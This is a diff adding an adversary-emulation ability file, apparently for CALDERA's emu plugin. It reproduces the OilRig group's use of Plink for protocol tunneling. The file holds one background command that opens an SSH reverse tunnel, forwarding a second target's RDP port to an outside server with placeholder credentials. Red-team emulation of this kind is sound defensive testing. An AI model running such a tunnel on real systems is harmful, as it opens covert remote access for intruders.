@@ -1,0 +1,34 @@
+ability_id: 212995b5-acfc-404b-b3a9-a19cc0afa9a5
+access: {}
+additional_info: {}
+buckets:
+- command-and-control
+delete_payload: true
+description: 'Run Plink
+
+  '
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'exec-background C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh
+    -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name}
+    -pw "#{caldera.user.password}" #{caldera.server.ip}'
+  language: null
+  name: proc
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 120
+  uploads: []
+  variations: []
+name: OilRig Run Plink
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: command-and-control
+technique_id: T1572
+technique_name: Protocol Tunneling
